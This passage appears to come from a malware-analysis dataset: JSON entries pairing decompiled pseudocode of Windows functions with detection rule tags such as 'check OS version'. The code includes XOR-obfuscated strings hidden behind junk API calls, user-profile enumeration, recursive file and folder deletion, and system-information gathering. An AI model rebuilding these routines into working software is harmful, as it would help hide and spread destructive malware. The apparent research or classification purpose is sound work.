+ 1;\n                } while (iVar4 < 10);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(var_14h, iVar7);\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar2, lpFindFileData);\n                iVar4 = var_28h;\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (hFindFile == -1) {\n                    var_ch = 3;\n                }\n                else {\n                    var_ch = 0;\n                    var_24h = lpFindFileData + 0x2c;\n                    do {\n                        if (*var_24h != 0x2e) {\n                            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_24h);\n                            var_18h = iVar2 + 2 + var_1ch;\n                            if (var_20h < var_18h) {\n                                uVar1 = (*pcVar5)(0, lpFileName);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                                uVar1 = (*pcVar5)(8, var_18h * 2);\n                                lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                                if (lpFileName == 0) {\n                                    var_ch = 8;\n                                    break;\n                                }\n                                var_20h = var_18h;\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, iVar4);\n                            }\n                            else {\n                                *(lpFileName + 2 + var_1ch * 2) = 0;\n                            }\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, var_24h);\n                            if ((*lpFindFileData & 0x10) == 0) {\n                                iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpFileName);\n                            }\n                            else {\n                                var_ch = fcn.00404883(arg_8h);\n                                if (var_ch != 0) break;\n                                iVar2 = (*_sym.imp.KERNEL32.dll_RemoveDirectoryW)(lpFileName);\n                            }\n                            if ((iVar2 == 0) && (arg_8h == 0)) {\n                                var_ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                break;\n                            }\n                        }\n                        iVar2 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, lpFindFileData);\n                    } while (iVar2 != 0);\n                }\n                uVar1 = (*pcVar5)(0, iVar7);\n                pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar4);\n                (*pcVar6)(uVar1);\n                uVar1 = (*pcVar5)(0, lpFindFileData);\n                (*pcVar6)(uVar1);\n                iVar7 = var_ch;\n            }\n            uVar1 = (*pcVar5)(0, var_14h);\n            (*pcVar6)(uVar1);\n        }\n        if (lpFileName != 0) {\n            uVar1 = (*pcVar5)(0, lpFileName);\n            (*pcVar6)(uVar1);\n        }\n    }\n    if (var_34h != 0) {\n        uVar1 = (*pcVar5)(0, var_34h);\n        (*pcVar6)(uVar1);\n    }\n    return iVar7;\n}\n",
        "token_count": 1778
    },
    "00405161": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00405161(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    uchar *puVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint *puVar12;\n    uint32_t uVar13;\n    code *pcVar14;\n    int16_t *piVar15;\n    uint lpFindFileData;\n    uint lpString1;\n    uint *lpMem;\n    int32_t var_d4h;\n    int32_t var_d0h;\n    uint var_cch;\n    int32_t lpString2;\n    int32_t var_c4h;\n    int32_t var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b1h;\n    uint var_adh;\n    uint var_a9h;\n    uint var_a5h;\n    uint var_a1h;\n    uint var_9dh;\n    uint var_99h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    int32_t hFindFile;\n    uchar *ARG_0;\n    int16_t *var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uchar *lpFileName;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    ushort var_fh;\n    uint var_dh;\n    uint32_t var_9h;\n    int32_t dwBytes;\n    \n    pcVar2 = _sym.imp.USERENV.dll_GetProfilesDirectoryW;\n    var_cch = 0;\n    ARG_0 = NULL;\n    dwBytes = 0;\n    (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(0, &dwBytes);\n    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (dwBytes != 0) {\n        dwBytes = dwBytes + 10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes * 2);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_5ch = piVar4;\n        uVar3 = (*pcVar14)(8, dwBytes * 2);\n        lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (piVar4 != NULL) {\n            uVar3 = (*pcVar14)(8, 0x208);\n            puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            puVar6 = &lpFindFileData;\n            ARG_0 = puVar5;\n            for (iVar10 = 0x250; piVar4 = var_5ch,  iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            for (iVar10 = 0x208; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            puVar5 = lpFileName;\n            for (iVar10 = dwBytes * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            piVar15 = var_5ch;\n            for (iVar10 = dwBytes * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *piVar15 = 0;\n                piVar15 = piVar15 + 1;\n            }\n            iVar10 = (*pcVar2)(var_5ch, &dwBytes);\n            if (iVar10 != 0) {\n                iVar10 = lpFileName - piVar4;\n                do {\n                    iVar1 = *piVar4;\n                    *(piVar4 + iVar10) = iVar1;\n                    piVar4 = piVar4 + 1;\n                } while (iVar1 != 0);\n                var_54h = 0x7364452c;\n                var_50h = 0x4e6f707c;\n                var_4ch._0_2_ = 0x5273;\n                var_44h = 0x734e4570;\n                var_40h._0_1_ = 0x52;\n                uVar3 = (*pcVar14)(8, 0x15);\n                puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                var_c4h = 5;\n                iVar10 = 0;\n                lpMem = puVar6;\n                do {\n                    iVar7 = (*_sym.imp.USER32.dll_GetFocus)();\n                    if (iVar7 != 0x15ce03) {\n                        *(iVar10 + puVar6) = *(&var_44h + iVar10 % var_c4h) ^ (iVar10 + puVar6)[&var_54h - puVar6];\n                    }\n                    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    iVar10 = iVar10 + 1;\n                    puVar12 = puVar6;\n                } while (iVar10 < 10);\n                do {\n                    iVar1 = *puVar12;\n                    puVar12 = puVar12 + 2;\n                } while (iVar1 != 0);\n                uVar13 = puVar12 - puVar6;\n                puVar12 = lpFileName + -2;\n                do {\n                    piVar4 = puVar12 + 2;\n                    puVar12 = puVar12 + 2;\n                } while (*piVar4 != 0);\n                for (uVar11 = uVar13 >> 2; uVar11 != 0; uVar11 = uVar11 - 1) {\n                    *puVar12 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                for (uVar13 = uVar13 & 3; uVar13 != 0; uVar13 = uVar13 - 1) {\n                    *puVar12 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n                if (hFindFile != -1) {\n                    var_58h = 0x71637718;\n                    var_6ch = 0x71637736;\n                    var_68h._0_1_ = 0x6e;\n                    var_7ch = 0x547f5a7c;\n                    var_78h._0_2_ = 0x4f30;\n                    var_84h = 0x54515a52;\n                    var_80h._0_2_ = 0x4f30;\n                    var_c0h = 6;\n                    do {\n                        iVar7 = 0;\n                        uVar3 = (*pcVar14)(8, 9);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        lpString2 = iVar10;\n                        var_3ch = &var_58h - iVar10;\n                        do {\n                            iVar8 = (*_sym.imp.USER32.dll_GetInputState)();\n                            if (iVar8 != 0xa8f70c) {\n                                *(iVar7 + iVar10) = *(&var_6ch + iVar7 % var_c4h) ^ (iVar7 + iVar10)[&var_58h - iVar10];\n                            }\n                            iVar7 = iVar7 + 1;\n                        } while (iVar7 < 4);\n                        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        iVar7 = 0;\n                        var_44h = iVar10;\n                        var_3ch = &var_7ch - iVar10;\n                        do {\n                            iVar9 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n                            iVar8 = lpString2;\n                            if (iVar9 != 0x6700ec) {\n                                *(iVar7 + iVar10) = *(&var_84h + iVar7 % var_c0h) ^ (iVar7 + iVar10)[&var_7ch - iVar10];\n                            }\n                            iVar7 = iVar7 + 1;\n                        } while (iVar7 < 6);\n                        iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, lpString2);\n                        pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (((iVar7 != 0) &&\n                            (iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, iVar10),  iVar7 != 0)) &&\n                           ((lpFindFileData & 0x10) != 0)) {\n                            var_30h = 0x6f5d511d;\n                            var_2ch = 0x5130662f;\n                            var_28h = 0x666c6f5e;\n                            var_24h = 0x6f575102;\n                            var_20h = 0x51256638;\n                            var_1ch = 0x66226f5b;\n                            var_18h = 0x6f415136;\n                            var_14h._0_1_ = 0x10;\n                            var_14h._1_1_ = 0x66;\n                            var_14h._2_1_ = 5;\n                            stack0xffffffeb = 0x5751;\n                            var_fh = 0x216f;\n                            var_dh._0_2_ = 0x2166;\n                            var_dh._2_2_ = 0x3251;\n                            var_9h._0_1_ = 0x6f;\n                            var_8ch = 0x6f325151;\n                            var_88h._0_2_ = 0x664c;\n                            uVar3 = (*pcVar14)(8, 0x51);\n                            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                            iVar7 = 0;\n                            var_3ch = iVar10;\n                            unique0x1000060e = &var_30h - iVar10;\n                            do {\n                                iVar8 = (*_sym.imp.USER32.dll_GetCapture)();\n                                if (iVar8 != 0xd6fbd1) {\n                                    *(iVar7 + iVar10) =\n                                         *(&var_8ch + iVar7 % var_c0h) ^ (iVar7 + iVar10)[&var_30h - iVar10];\n                                }\n                                iVar7 = iVar7 + 1;\n                            } while (iVar7 < 0x28);\n                            var_bch = 0x36487503;\n                            var_b8h._0_2_ = 0x5632;\n                            var_b8h._2_1_ = 6;\n                            stack0xffffff47 = 0x36365975;\n                            var_b1h = 0x64752356;\n                            var_adh = 0x2d560e36;\n                            var_a9h = 0x23365b75;\n                            var_a5h = 0x64752e56;\n                            var_a1h = 0x27561636;\n                            var_9dh = 0x32365575;\n                            var_99h._0_2_ = 0x4256;\n                            var_99h._2_1_ = 0x75;\n                            var_94h = 0x36387542;\n                            var_90h._0_2_ = 0x5642;\n                            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n                            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                            iVar7 = 0;\n                            var_d4h = iVar10;\n                            unique0x1000060a = &var_bch - iVar10;\n                            do {\n                                iVar8 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n                                if (iVar8 != 0x3d616d) {\n                                    *(iVar7 + iVar10) =\n                                         *(&var_94h + iVar7 % var_c0h) ^ (iVar7 + iVar10)[&var_bch - iVar10];\n                                }\n                                iVar7 = iVar7 + 1;\n                            } while (iVar7 < 0x26);\n                            var_50h = var_3ch;\n                            stack0xfffffff4 = 0;\n                            var_74h = 0x7a736866;\n                            var_70h._0_1_ = 0x67;\n                            pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                            var_54h = iVar10;\n                            do {\n                                var_38h = 0x7a006843;\n                                var_34h = 0x734d663b;\n                                var_30h = 0x683a6709;\n                                var_2ch = 0x66147a56;\n                                var_28h = 0x670f7334;\n                                var_24h = 0x7a196817;\n                                var_20h = 0x73036604;\n                                var_1ch = 0x6801671f;\n                                var_18h = 0x660f7a06;\n                                var_14h._0_1_ = 4;\n                                var_14h._1_1_ = 0x73;\n                                var_14h._2_1_ = 0x54;\n                                stack0xffffffeb = 0x1267;\n                                var_fh = 0x1e68;\n                                var_dh._0_2_ = 0x177a;\n                                var_dh._2_2_ = 0x6866;\n                                var_9h._0_1_ = 0x73;\n                                uVar3 = (*pcVar14)(8, 0x61);\n                                iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                                iVar7 = 0;\n                                var_d0h = &var_38h - iVar10;\n                                do {\n                                    iVar8 = (*_sym.imp.USER32.dll_GetFocus)();\n                                    puVar5 = ARG_0;\n                                    if (iVar8 != 0x4fe141) {\n                                        *(iVar7 + iVar10) =\n                                             *(&var_74h + iVar7 % var_c4h) ^ (iVar7 + iVar10)[&var_38h - iVar10];\n                                    }\n                                    iVar7 = iVar7 + 1;\n                                } while (iVar7 < 0x30);\n                                (*_sym.imp.USER32.dll_wsprintfW)\n                                          (ARG_0, iVar10, var_5ch, &lpString1, (&var_54h)[stack0xfffffff4]);\n                                iVar7 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(puVar5);\n                                pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                if (iVar7 != -1) {\n                                    fcn.00404b69();\n                                    var_cch = 1;\n                                }\n                                uVar3 = (*pcVar14)(0, iVar10);\n                                pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                                *NULL = stack0xfffffff4 + 1;\n                            } while (*NULL < 2);\n                            uVar3 = (*pcVar14)(0, var_d4h);\n                            (*pcVar2)(uVar3);\n                            uVar3 = (*pcVar14)(0, var_3ch);\n                            (*pcVar2)(uVar3);\n                            iVar10 = var_44h;\n                            iVar8 = lpString2;\n                        }\n                        uVar3 = (*pcVar14)(0, iVar10);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                        uVar3 = (*pcVar14)(0, iVar8);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n                    } while (iVar10 != 0);\n                }\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                uVar3 = (*pcVar14)(0, lpMem);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                piVar4 = var_5ch;\n            }\n        }\n        if (lpFileName != NULL) {\n            uVar3 = (*pcVar14)(0, lpFileName);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        if (piVar4 != NULL) {\n            uVar3 = (*pcVar14)(0, piVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        if (ARG_0 != NULL) {\n            uVar3 = (*pcVar14)(0, ARG_0);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n    }\n    return var_cch;\n}\n",
        "token_count": 4039
    },
    "00405859": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00405859(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpModuleName;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    puVar9 = &var_24h;\n    for (iVar7 = 8; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_30h = 0x3b2f1723;\n    var_2ch._0_2_ = 0x6358;\n    var_2ch._2_1_ = 7;\n    var_2ch._3_1_ = 0x27;\n    var_28h._0_2_ = 0x343b;\n    var_1ch = 0x574b634d;\n    var_18h._0_1_ = 0x34;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_4h = 5;\n    iVar8 = 0;\n    lpModuleName = iVar7;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar4 != 0x86a4c2) {\n            *(iVar8 + iVar7) = *(&var_1ch + iVar8 % var_4h) ^ (iVar8 + iVar7)[&var_30h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_34h = 0x345c1c14;\n    var_30h = 0x45182b24;\n    var_2ch._0_2_ = 0x2e03;\n    var_2ch._2_1_ = 5;\n    var_2ch._3_1_ = 0x1a;\n    var_28h._0_2_ = 0x4453;\n    var_28h._2_1_ = 0x79;\n    var_28h._3_1_ = 0x46;\n    var_1ch = 0x77306846;\n    var_18h._0_1_ = 0x4b;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_ch = &var_34h - iVar7;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        iVar4 = lpModuleName;\n        if (iVar5 != 0x9b4f0a) {\n            *(iVar8 + iVar7) = *(&var_1ch + iVar8 % var_4h) ^ (iVar8 + iVar7)[&var_34h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x10);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar7);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    cVar2 = fcn.00403dd2();\n    if (cVar2 != '\\0') {\n        var_8h = (*pcVar6)(0, var_20h, var_24h);\n    }\n    fcn.0040d3e1();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar1)(0, iVar4);\n    (*pcVar6)(uVar3);\n    return var_8h;\n}\n",
        "token_count": 1056
    },
    "00405d76": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00405d76(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = *0x41dab8;\n    fcn.00407a32();\n    uVar2 = fcn.00407a32();\n    iVar3 = fcn.004059b5(uVar2 & 0xff, 0x41dab8, 0x41dad0, &var_8h);\n    if (iVar3 != 0) {\n        iVar3 = fcn.004059b5(0, 0x41dab8, 0x41dad4, &var_8h);\n        if (iVar3 != 0) {\n            var_24h = 0x51514d64;\n            var_20h = 0x34284a3e;\n            var_1ch._0_2_ = 0x4651;\n            var_18h = 0x51344d4a;\n            var_14h._0_1_ = 0x46;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n                if (iVar5 != 0xeaf92e) {\n                    var_10h = 5;\n                    *(iVar6 + iVar3) = *(&var_18h + iVar6 % 5) ^ (iVar6 + iVar3)[&var_24h - iVar3];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 10);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(*0x41dad4, iVar3);\n            iVar6 = fcn.004059b5(0, 0x41dab8, 0x41dac8, &var_8h);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar6 != 0) {\n                var_4h = var_4h ^ 0x29787279;\n                var_4h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                iVar6 = fcn.004059b5(0, &var_4h, 0x41dabc, &var_8h);\n                if (iVar6 != 0) {\n                    var_ch = 1;\n                }\n            }\n            uVar4 = (*pcVar1)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 714
    },
    "00405ecb": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00405ecb(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    uchar *puVar10;\n    int32_t iVar11;\n    uint uStack1432;\n    uint uStack1428;\n    char *lpString;\n    uchar *puStack1396;\n    uint uStack1392;\n    uint uStack1388;\n    uint uStack1384;\n    uint uStack1380;\n    uchar *puStack1376;\n    uint uStack1372;\n    uchar *puStack1368;\n    uint uStack1364;\n    uint uStack1360;\n    uint uStack1356;\n    uint uStack1352;\n    uchar *puStack1348;\n    int32_t iStack1344;\n    uchar uStack1340;\n    ushort uStack1339;\n    uchar uStack1337;\n    uint uStack1320;\n    int32_t iStack1316;\n    ushort uStack1312;\n    uchar uStack1310;\n    uchar uStack1309;\n    uint uStack1308;\n    uint uStack1304;\n    uint uStack1300;\n    uchar uStack1296;\n    int32_t iStack1292;\n    uchar uStack1288;\n    uint32_t uStack1287;\n    uint uStack1283;\n    uint uStack1279;\n    uint uStack1275;\n    uint uStack1271;\n    uint32_t uStack1267;\n    uint uStack1263;\n    uint uStack1259;\n    uint uStack1255;\n    uint uStack1251;\n    uint uStack1247;\n    uint uStack1243;\n    uint uStack1239;\n    uint uStack1235;\n    ushort uStack1231;\n    uchar uStack1229;\n    uint uStack1228;\n    uchar uStack1224;\n    uint uStack1223;\n    uint uStack1219;\n    uint uStack1215;\n    uint uStack1211;\n    uint uStack1207;\n    uint uStack1203;\n    uchar uStack1199;\n    uint32_t uStack1196;\n    int32_t iStack1192;\n    uint uStack1172;\n    uint uStack1168;\n    uchar auStack1160 [4];\n    int32_t iStack1156;\n    uchar auStack1148 [8];\n    uint uStack1140;\n    int16_t iStack1136;\n    uchar auStack1134 [26];\n    uchar auStack1108 [40];\n    uchar auStack1068 [36];\n    uchar auStack1032 [1028];\n    \n    uStack1140 = 0x200;\n    uStack1308 = 0x342b1338;\n    puVar10 = &stack0xfffffbf8;\n    for (iVar8 = 0x400; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uStack1304 = 0x4460070b;\n    puVar10 = &stack0xfffffb90;\n    for (iVar8 = 0x40; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uStack1340 = 0xe;\n    uStack1339 = 0;\n    uStack1337 = 0;\n    uStack1300 = 0x7023e77;\n    puVar10 = &stack0xfffffbd4;\n    for (iVar8 = 0x24; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    iStack1344 = 8;\n    uStack1296 = 0x53;\n    uStack1320 = CONCAT22(uStack1320._2_2_, 0x6b6e);\n    puStack1348 = 0x405f45;\n    puStack1348 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack1352 = 0x405f4c;\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    uStack1279 = uStack1279 & 0xffffff | 0x6000000;\n    uStack1275 = uStack1275._3_1_ << 0x18;\n    uStack1267 = uStack1267 & 0xffffff;\n    uStack1263 = uStack1263._3_1_ << 0x18;\n    iVar11 = 0;\n    iStack1156 = iVar8;\n    do {\n        uStack1352 = 0x405f73;\n        iVar3 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar3 != 0xac8272) {\n            *(iVar11 + iVar8) =\n                 (&stack0xfffffac8)[iVar11 % CONCAT31(uStack1275, uStack1279._3_1_)] ^\n                 (iVar11 + iVar8)[&stack0xfffffad8 + -iVar8];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xd);\n    uStack1352 = 0x15;\n    uStack1356 = 8;\n    uStack1320 = 0x261f107f;\n    iStack1316 = 0x1d1c4c02;\n    uStack1312 = 0x300d;\n    uStack1310 = 0x41;\n    uStack1309 = 6;\n    uStack1308 = 0x710e0d1f;\n    uStack1304 = 0x63070d1b;\n    uStack1360 = 0x405fdf;\n    uStack1360 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack1364 = 0x405fe6;\n    uVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iStack1292 = 5;\n    uStack1279 = uStack1279 & 0xff000000 | uVar4 >> 8;\n    iVar8 = 0;\n    puVar10 = &stack0xfffffacc + -uVar4;\n    uStack1287 = uStack1287 & 0xffffff | puVar10 * 0x1000000;\n    uStack1283._0_3_ = puVar10 >> 8;\n    uStack1283 = CONCAT13(uVar4, uStack1283);\n    do {\n        uStack1364 = 0x40600a;\n        iVar11 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar11 != 0xe0eb62) {\n            *(iVar8 + uVar4) = (&stack0xfffffabc)[iVar8 % iStack1292] ^ (iVar8 + uVar4)[puVar10];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x14);\n    puStack1368 = uStack1168;\n    uStack1372 = 0x406039;\n    uStack1364 = uVar4;\n    uStack1372 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    puStack1376 = 0x406040;\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    uStack1172 = 0x40;\n    puStack1376 = &stack0xfffffb6c;\n    uStack1380 = 0x40605b;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)();\n    uStack1380 = &stack0xfffffbac;\n    if (pcVar5 == NULL) {\n        uStack1384 = 0x406071;\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)();\n    }\n    else {\n        uStack1384 = 0x406069;\n        (*pcVar5)();\n    }\n    uStack1384 = 0xbd;\n    uStack1388 = 8;\n    iStack1292 = 0x57124b71;\n    uStack1288 = 6;\n    uStack1287 = 0x44b5d47;\n    uStack1283 = 0x4b471557;\n    uStack1279 = 0x2857164b;\n    uStack1275 = 0x364b7d47;\n    uStack1271 = 0x7a472757;\n    uStack1267 = 0x3d57214b;\n    uStack1263 = 0x274b6947;\n    uStack1259 = 0x76473d57;\n    uStack1255 = 0x28573d4b;\n    uStack1251 = 0xa4b6a47;\n    uStack1247 = 0x4d470757;\n    uStack1243 = 0x1957164b;\n    uStack1239 = 0x304b6547;\n    uStack1235 = 0x57471157;\n    uStack1231 = 0x74b;\n    uStack1229 = 0x57;\n    uStack1228 = 0x4b584706;\n    uStack1224 = 0x1f;\n    uStack1223 = 0x4b472457;\n    uStack1219 = 0x17571c4b;\n    uStack1215 = 0x4b5c47;\n    uStack1211 = 0x56470757;\n    uStack1207 = 0x2857014b;\n    uStack1203 = 0x734b0947;\n    uStack1199 = 0x57;\n    puStack1368 = 0x57734b39;\n    uStack1364 = CONCAT22(uStack1364._2_2_, 0x4774);\n    uStack1392 = 0x406191;\n    uStack1392 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    puStack1396 = 0x406198;\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iVar11 = 0;\n    iStack1316 = iVar8;\n    do {\n        puStack1396 = 0x4061b4;\n        iVar3 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar3 != 0x7bc09a) {\n            *(iVar11 + iVar8) = (&stack0xfffffa9c)[iVar11 % uStack1320] ^ (iVar11 + iVar8)[&stack0xfffffae8 + -iVar8];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x5e);\n    puStack1396 = &stack0xfffffb4c;\n    iVar8 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)();\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar8 == 0) {\n        